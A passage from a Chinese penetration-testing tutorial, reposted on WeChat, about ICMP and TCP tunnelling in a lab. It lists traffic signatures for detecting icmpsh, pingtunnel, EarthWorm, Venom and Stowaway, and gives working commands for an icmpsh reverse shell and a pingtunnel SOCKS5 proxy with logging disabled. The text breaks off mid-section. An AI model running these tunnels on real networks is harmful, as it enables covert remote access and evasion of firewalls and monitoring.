---
title: 隧道代理攻防技术战争手册
url: https://mp.weixin.qq.com/s/8zJpJHGaa6hTfaUTMHnZ-g
source: Doonsec's feed
date: 2026-01-23
fetch_date: 2026-01-24T03:24:17.076623
---

# 隧道代理攻防技术战争手册

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib96z7YjrCfNumpZrjiah9aezLpOT6IcGEHMxJfTyQ96cHfuFJKDIumKfA/0?wx_fmt=jpeg)

# 隧道代理攻防技术战争手册

Locks\_
Locks\_

泷羽Sec-track

![]()

在小说阅读器中沉浸阅读

> 声明！本文章所有的工具分享仅仅只是供大家学习交流为主，切勿用于非法用途，如有任何触犯法律的行为，均与本人及团队无关！！！

**往期推荐：**

**[【工具】Hikvision海康威视综合漏洞利用工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489438&idx=1&sn=e10b275b1a4e646c26ac9c63e0910cad&scene=21#wechat_redirect)**

**[【好靶场】云安全专场-WP](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489362&idx=1&sn=18036efc6055c5f670c7cb8e5205afa9&scene=21#wechat_redirect)**

**[【工具】Shiro反序列化利用工具](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489273&idx=1&sn=89c2855997f7c0317211bb21b7c3bdb5&scene=21#wechat_redirect)**

**[【工具】Sqlmap中文汉化版](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489242&idx=1&sn=67c1cac7a017a4f1c57e97fc415ef6fd&scene=21#wechat_redirect)**

**[若依(RuoYi)框架漏洞战争手册](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489224&idx=1&sn=a59ca4e14728e9a03b38223b57f39447&scene=21#wechat_redirect)**

**[【工具】多平台GUI图形化资产测绘工具，支持一键导出](https://mp.weixin.qq.com/s?__biz=MzkzNzg4MTI0NQ==&mid=2247489051&idx=1&sn=c1dcbe17078b6ed0bd16e7d061bae691&scene=21#wechat_redirect)**

**公众号：**

文章转载至

```
作者：Locks_
https://forum.butian.net/share/4397
```

> 本文将深入解析各类隧道代理技术（如ICMP、HTTP、DNS、TCP/UDP等）的实现原理与实战应用，通过具体工具手法（如Ping、cURL、nslookup、Telnet等）演示如何伪装和转发流量，并详细介绍多级隧道代理的搭建方法与技巧，帮助读者掌握隐蔽通信、绕过防火墙限制的核心能力，提升网络渗透与安全防护的实战水平。

## 前置

|  |  |
| --- | --- |
| ICMP | ping ip/domain |
| HTTP | curl ip or domain |
| DNS | nslookup domain 8.8.8.8 |
| TCP/UDP | telnet ip port |

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9k3UM5lcFHWowCuwcFR16ZUdCOGQPh5UriaJ0wwD2sIuXXN6WTuOB63A/640?wx_fmt=png&from=appmsg)

image.png

攻击机器

* 本机IP：192.168.200.111
* kali：192.168.99.129

目标机器

* win8：192.168.99.134
* 第二层网卡：10.10.10.3
* win10：10.10.10.4
* 开启3306

## ICMP隧道技术

**什么是ICMP协议**ICMP（Internet Control Message Protocol，Internet控制报文协议）是Internet协议族中的一个协议，用于在IP网络中传递控制消息和错误报告。ICMP属于TCP/IP协议族中的第三层-网络层协议。

### ICMP隧道流量特征

正常情况下，单位时间内数据包发送的数量为一组。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9Ub7O0SMIwz660uKLSlQWRibqflOXSoqG5CvNkXCqfQUs5TBIogiazfWw/640?wx_fmt=png&from=appmsg)

image.png

单组数据包Data字段长度，Windows为32 bytes，Linux下为48 bytes，并且请求包和响应包长度相同。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9LKibuCjGQJyAE6sjQtoAsIva97YtM2LWHtePODf7Ld782H4IIYXUgyA/640?wx_fmt=png&from=appmsg)单组数据包Data字段内容中，Windows为`abcdefghijklmnopqrstuvwabcdefghi`，Linux下为`!”#$%&’()+,-./01234567`。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9wJ1gYAFZwV2JTqoCMu3KibyQV83sELAHOGMxKl4icVpJNxZmcibgXjCeA/640?wx_fmt=png&from=appmsg)数据包Type字段类型为0或者8，表示请求和应答。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib96kI7nK01UjpLQq1gKVFhgNviavpvjibmAZXLjzic0PHWtL22fGiagJEEjg/640?wx_fmt=png&from=appmsg)

image.png

在icmpsh中，其交互过程的数据包中请求包和响应包长度明显不相同，并且Data字段内容明显为明文的敏感信息。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9Sd1ZR3mNicRnvlVMnyMa7iazIrCd3NPay2qSAgia33oFibRHOHjySHBCyg/640?wx_fmt=png&from=appmsg)

image.png

在pingtunnel中，明显地，单位时间内数据包的数量过大。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9j9hU0VXFwtHjm9dKrAZKluAbVZROdbc39gTsRZMIJeDuOtIMJNdodw/640?wx_fmt=png&from=appmsg)单组数据包Data字段长度非默认长度，并且请求和应答报文的长度也不相同。在单组数据包Data字段内容中，在交互过程存在会话key和明文访问信息

pingtunnel在访问过程会把会话key和访问信息封装到icmp协议的data字段中。

流量检测关键点：

* 单位时间内数据包的数量
* 单组数据包Data字段长度
* 单组数据包Data字段内容

### icmpsh

icmpsh是⼀个简单的反向ICMP shell⼯具。与其他类似的开源⼯具相⽐，主要优势在于它不需要管理权限即可在⽬标机器上运⾏。 客户端只能在Windows机器运⾏，服务端可以在任何平台上运⾏。

下载 https://github.com/bdamele/icmpsh

使⽤ kali 192.168.200.129 win8 靶机 192.168.99.135

#### 服务端：

```
git clone https://github.com/inquisb/icmpsh.git

#关闭icmp回复,如果要开启icmp回复，该值设置为0
#_因为icmpsh工具要代替系统本身的icmp应答程序，所以需要提前关闭本地系统的icmp应答，否则Shell的运行会不稳定_
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#运⾏，第⼀个IP是VPS的eth0⽹卡IP，第⼆个IP是⽬标机器出⼝的公⽹IP
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
python2 get-pip.py

#安装impacket
python2 -m pip install impacket
#这里可能报错 使用本地安装
https://github.com/fortra/impacket/releases/tag/impacket_0_11_0
python2 setup.py install

python2 icmpsh_m.py 192.168.99.129 192.168.99.135
```

#### 客户端：

```
-t 主机ip地址以发送ping请求。这个选项是强制性的！
-r 发送⼀个包含字符串“Test1234”的测试icmp请求，然后退出。
-d 毫秒请求之间的延迟（毫秒）
-o 毫秒响应超时（毫秒）。如果没有及时收到回复，从机将增加空⽩计数器。如果该计数器达到某个极限，从机将退出。
如果收到响应，计数器将设置回0。
-b 空⽩数量限制（退出前未答复的icmp请求）
-s 字节最⼤数据缓冲区⼤⼩（字节）

icmpsh.exe -t 192.168.99.129 -d 500 -b 30 -s 128
```

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib95jorxWlW92R9QXQAVWsuGkdrWgIHljQicibJNPGFnnyiavgWiaSQOF9B8w/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9B5ibj1icicctiauob3MIw9nUwMekvkVXOGh2FwCPyprp6I68lT0GZEdCTg/640?wx_fmt=png&from=appmsg)

image.png

### pingtunnel

Pingtunnel 是⼀种通过 ICMP 发送 TCP/UDP 流量的⼯具。其是最流⾏的⼀款ICMP代理⼯具，提供对tcp/udp/sock5流量伪装成icmp流量进⾏转发的功能。需要root或者administrator/system权限。

下载 https://github.com/esrrhs/pingtunnel

#### ⾼权限条件下

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9L8b4oElCozK1AgzGYm5lRk2dUbLETP0n1bwZz0ZqncrlknDoIeJDQQ/640?wx_fmt=png&from=appmsg)

image.png

##### 构建反向代理

###### 1）服务端

```
-type server 代表开启ICMP SERVER端，等待客户端进⾏连接与通信。
-noprint 1 不在控制台打印⽇志
-nolog 1 不存储⽇志⽂件

echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all

./pingtunnel -type server -noprint 1 -nolog 1
```

设置 socks5

```
pingtunnel.exe -type client -l :4455 -s 192.168.99.129 -sock5 1 -noprint 1 -nolog 1
```

## TCP隧道技术

### TCP隧道流量特征

**EarthWorm**ew在建立连接的过程中，数据包存在额外的数据特征“xx xx 00 00 00 00” 客户端发送“01 01 00 00 00 00”

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9JPUlx39rqEibQLOPg5VT7jyyKJqOwOpuI4QyjmG27Z0tw7TyhG2Jx3w/640?wx_fmt=png&from=appmsg)

image.png

服务端应答“01 02 00 00 00 00”，建立连接。

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib98ooiaORWCQnYvWs7CbUK1cGzkxgIRicez696dSoiaajnIoiawsZSXUEFRg/640?wx_fmt=png&from=appmsg)

image.png

**Venom**未加密下venom在建立连接过程的过程中会先发起系列”00 00 00 00 00 00“

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9F0bwCOEKhUia6uLPwOthUINaCZzxGNKRIbtdr9WbrLH1EKxOtsr3xcg/640?wx_fmt=png&from=appmsg)接着通过携带“ABCDEFGH”，来判断是否为venom协议

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9RiaBt56pSpiaDqHcm17Sf602fbADDn4TLt6IBd5rwU6jJpca4Wg07D2A/640?wx_fmt=png&from=appmsg)

image.png

同时，通过携带“VCMD”，作为协议的数据分割

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9WK0DX3KnDFTjVoHxQDlBL0gzF4speEZb597UeDOSWZHDDO1GhYQuLw/640?wx_fmt=png&from=appmsg)

image.png

执行命令过程也为明文信息

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9WQ01zgeUIZ4En4zDZmltibXQic0cChcaLMPT14iaBk43HqBibf4NnhgiaTw/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9HggXVEhrCp3ujq2SEQzcy9Licibia1p87AO9HN6VAdtibePicKp6YLcMUcA/640?wx_fmt=png&from=appmsg)

image.png

使用venom的加密下，只存在较小的特征，如携带的数据全置零

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9Eichrw9CTRnyxoGtVPg5HrAkfs1liaicJbYickBqvccbJ0wnib41piaYhICA/640?wx_fmt=png&from=appmsg)

image.png

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9y1L1DkMpictBM3tfmb28Zzm6e3DtFbwZ5ezJ1qYTtJHQcb28BoO0AEQ/640?wx_fmt=png&from=appmsg)推测，其在只有在不使用端口复用时候，才存在

**Stowaway**加密和未加密情况下，除了部分数据加密外，特征并没有发生变化。

stowaway在建立连接过程的过程中客户端会先发起系列”00 00 00 00 00 00“

![image.png](https://mmbiz.qpic.cn/sz_mmbiz_png/YxCBEqEyrw3Xico31fG7eZwsJqMRL6uib9muF5NquQvIMgFvsh2ErqsCJSvM5ycXrZwsAVPg182hIjA19KP0tpRw/640?wx_fmt=png&from=appmsg)在服务端确认相同的“会话key”后，客户端发起请求管理端的信息

```
const ADMIN_UUID = "IAMADMINXD"
const TEMP_UUID = "IAMNEWHERE"
const TEMP_ROUTE = "THEREISNOROUTE"
```

由于未加密，存在明文信息

![image....